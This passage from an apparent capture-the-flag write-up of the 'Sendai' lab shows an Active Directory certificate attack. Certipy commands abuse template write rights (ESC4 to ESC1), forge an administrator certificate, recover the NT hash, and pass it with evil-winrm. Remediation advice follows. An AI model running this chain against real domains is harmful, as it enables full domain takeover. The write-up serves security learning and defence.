┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                        
 
Name                          State   Description                    Exploitable                                                                                                                                 
----                          -----   -----------                    -----------                                                                                                                                 
SeMachineAccountPrivilege     Enabled Add workstations to domain           False                                                                                                                                 
SeChangeNotifyPrivilege       Enabled Bypass traverse checking             False                                                                                                                                 
SeIncreaseWorkingSetPrivilege Enabled Increase a process working set       False                                                                                                                                 
 
 
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.109
 
Name        : Support                                                                                   
DisplayName :                                                                                           
ImagePath   : C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvc                                                                                                                         
User        : LocalSystem                                                                               
StartMode   : Automatic 
 
```

The service executable is launched with parameters that include clear credentials (username and password) passed directly into the command line.

------------------------------------------------------------------------

### Weaponization: Abuse of ESC4

After finding out that the user `clifford.davey` (or group `Authenticated Users`) has writing permissions on the template **SendaiComputer** (Vulnerability) **ESC4**), we use `certipy` to change the template configuration itself.

```
certipy template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration -no-save
 
```

**What's going on here?** We are abusing writing permissions to reconfigure the template and make it vulnerable to **ESC1**. The command sets specific flags:

- `Enrollee Supplies Subject`: **True.** (It allows us to specify who we want to impersonate in the certificate).
- `Client Authentication`: **True.** (The certificate can be used for login).
- `Authorized Signatures`: **0** (No manual approval required).

### Verification of Vulnerability (ESC1)

We perform a scan again to confirm that the changes have been applied correctly.

```
certipy find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2026-01-06T17:55:32+00:00
    Permissions
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Authenticated Users
        Write Owner Principals          : SENDAI.VL\Authenticated Users
        Write Dacl Principals           : SENDAI.VL\Authenticated Users
    [+] User Enrollable Principals      : SENDAI.VL\Authenticated Users
    [+] User ACL Principals             : SENDAI.VL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
 
```

**Output analysis:** Under `[!] Vulnerabilities`, now we see clearly:

- **ESC1**: *“Enrolle supplies subject and template allows authentication clients. ”*
- This confirms that we have turned a harmless template into a tool to create administrators.

### Exploitation: Certificate Forging

Now we request a CA certificate using the manipulated template. The trick lies in the parameter `-upn` (User Principal Name).

```
certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
 
Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
 
certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[*] Request ID is 51
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sendai.vl'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
 
```

> Technical Note
>
> The first attempt fails for NetBIOS timeout, but the second one goes well (`Successfully requested certificate`). We're telling the CA: *“Hello, I am clifford.davey, I have permission to use this template. Please issue a valid certificate **Administrator**.”* Thanks to the previous change, CA trusts and delivers `administrator.pfx`.

### Authentication & Domain Dominance

We have a digital certificate valid for the administrator, but to access via WinRM We need a NTLM hash or password. We use `certipy auth` to authenticate us via Kerberos (PKINIT) using the certificate.

```
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66
Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
[*] Certificate identities:
[*]     SAN UPN: 'administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
 
```

**Result:** The Domain Controller validates the certificate and returns the Administrator NTLM hash: `aad3...:cfb106feec8b89a3d98e14dcbe8d087a`

### Pwned! 🚩

Finally, we perform a classic **The-Hash** with `evil-winrm` to get a shell like Domain Admin and read the flag `root.txt`.

```
evil-winrm-py -i DC.sendai.vl -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a
```

------------------------------------------------------------------------

## 🛡️ Remediation & Defense

The compromise **Sendai** highlights how a chain of misconfigurations, starting from a Guest access to certificate services, can lead to the total compromise of the domain.

> Critical Vulnerability: ADCS Misconfiguration (ESC4 ➔ ESC1)
>
> Escalation a Domain Admin was made possible by excessive permissions on the Certificate Template `SendaiComputer`.
>
> **Fix Immediate:** Remove writing permissions (**WriteOwner**, **WriteDacl**, **FullControl**) for unprivileged users (as `Authenticated Users` or `clifford.davey`) on certificate templates.
>
> **Hardening:** Make sure the flag `ENROLLEE_SUPPLIES_SUBJECT` is never enabled on templates that allow client authentication, unless it is strictly necessary and protected by “Manager Approval”.

### 🔒 Hardening Active Directory & Services

1.  **Disable Guest/Null Session Access:**

    - The attack started because the Domain Controller allowed anonymous enumeration SMB.
    - **Action:** Set the registry key `RestrictAnonymous` a `1` or `2` and disable the Guest account via GPO. Prevent share enumeration for unauthorized users.

2.  **Management of Credentials in Services:**

    - The service has been identified `Support` running a track with clear credentials (`-u clifford.davey -p ...`) passed as arguments.
    - **Action:** Never pass credentials as command line arguments (easy readable via WMI/API). Use **Group Managed Service Accounts (gMSA)** or virtual service accounts.

3.  **Password Policy & Monitoring:**

    - The account `Thomas.Powell` was exposed with the state `PasswordMustChange` accessible SMB null-session.
    - **Action:** Monitor accounts with expired passwords or “Must Change” and prevent password change from being made through legacy protocols or unfulfilled sessions.

4.  **Principle of Minimum Privilege (ACL):**

    - The group `Support` had total control (`GenericAll`) on the group `AdmSvc`, allowing recovery of passwords GMSA `mgtsvc$`.
    - **Action:** Perform periodic audits of ACLs with tools such as **BloodHound** or **PingCastle** to identify and break dangerous attack chains (Attack Paths) between support groups and service accounts.
